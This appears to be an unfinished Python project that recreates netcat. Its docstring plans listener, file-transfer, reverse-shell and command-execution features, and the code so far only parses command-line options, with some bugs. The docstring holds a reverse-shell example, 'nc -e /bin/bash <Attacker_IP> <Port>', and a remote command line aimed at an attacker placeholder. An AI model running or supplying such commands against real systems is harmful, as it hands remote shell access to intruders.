"""
subject: Recreate netcat (administration swiss knife tool)

For this project, i want to implement just some type of netcat:
	- basic client server communication:
		* listener : nc -lvp <Port>
		* connect : nc <IP_Address> <Port>
	
	- file upload and download:
		* upload : nc <Receiver_IP> <Port> < file.txt
		* download : nc -lvp <Port> > file.txt
	
	- reverse shell and command execution
		* reverse shell : nc -e /bin/bash <Attacker_IP> <Port>
		* command execution : nc -c whoami <Attacker_IP> <Port>
"""
import sys
import subprocess

def	parser():
	argvLen = len(sys.argv)
	input = []
	for i in range(1, argvLen):
		input.append(sys.argv[i])
	return input

def	isOpt(arg):
	argList = ""
	p = 0
	t = 0
	c = 0
	e = 0
	if arg[0] != "-":
		return (0)
	for char in arg[1:]:
		if char not in "tcnvlpe":
			print("Option not supported!")
			sys.exit(0)
		if char not in argList:
			argList += ""			
		else:
			print("Invalid Option!")
			sys.exit(0)
		if char in "tcep" and (p or t or e or c):
			print("Invalid Option!")
			sys.exit(0)
		p += 1 if char == "p" else  0
		t += 1 if char == "t" else  0
		e += 1 if char == "e" else  0
		c += 1 if char == "c" else  0
	return (1)

def	checkInputErr(input):
	inputLen = len(input)
	pos = 0
	VERBOSE = False
	LISTENNING = False
	CMD = False
	argList = "" 
	for arg in input:
		inputLen -= 1
		if isOpt(arg):
			if "t" in arg or "c" in arg or "e" in arg or "p" in arg:
				#no arg after tcep opt
				if inputLen == 0:
					print("Invalid Option!")
					sys.exit(0)
				#option after tcep
				if isOpt(input[pos + 1]):
					print("Invalid Option!")
					sys.exit(0)
			#check is arg is already there
			for char in arg[1:]:
				if char in argList:
					print("Invalid Option!")
					sys.exit(0)
				argList += char
	if "e" in argList and "c" in argList:
		print("Invalid Option!")
		sys.exit(0)
	if "v" in argList:
		VERBOSE = True
	if "l" in argList:
		LISTENNING = True
	if "c" in argList or "e" in argList:
		CMD = True
	return (VERBOSE, LISTENNING, CMD)

def	getArg(input):
	PORT = ""
	IP = ""
	CMD = ""
	# FILE = ""
	for i in range(len(input)):
		if "t" in input[i]:
			IP = input[i + 1]
		elif "p" in input[i]:
			PORT = input[i + 1]
		elif "e" in input[i] or "c" in input[i]:
			CMD = input[i + 1]
		else:
			if len(IP) == 0:
				IP = input[i]
			elif len(PORT) == 0:
				PORT = input[i]
			elif len(CMD) == 0:
				CMD = input[i]
			else:
				print(f"IP={IP} PORT={PORT} CMD={CMD}")
				print("Invalid Option!")
				sys.exit(0)
	print(f"IP={IP} PORT={PORT} CMD={CMD}")
	

input = parser()
print(input)
print(checkInputErr(input))
print(getArg(input))